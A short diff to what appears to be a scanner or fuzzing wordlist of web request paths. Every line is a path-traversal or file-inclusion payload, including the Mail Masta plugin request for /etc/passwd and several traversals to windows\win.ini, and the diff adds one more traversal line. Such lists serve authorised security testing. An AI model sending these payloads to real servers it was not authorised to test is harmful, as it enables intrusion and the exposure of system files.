@@ -4,3 +4,4 @@
 /wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd
 /?h=44ea8a6603cbf54e245f37b4ddaf8f36&page=vlf&action=edit&fileName=..\..\..\windows\win.ini
 /source/loggin/page_log_dwn_file.hsp?h=44ea8a6603cbf54e245f37b4ddaf8f36&action=download&fileName=..\..\..\windows\win.ini
+/webeditor/../../../windows/win.ini
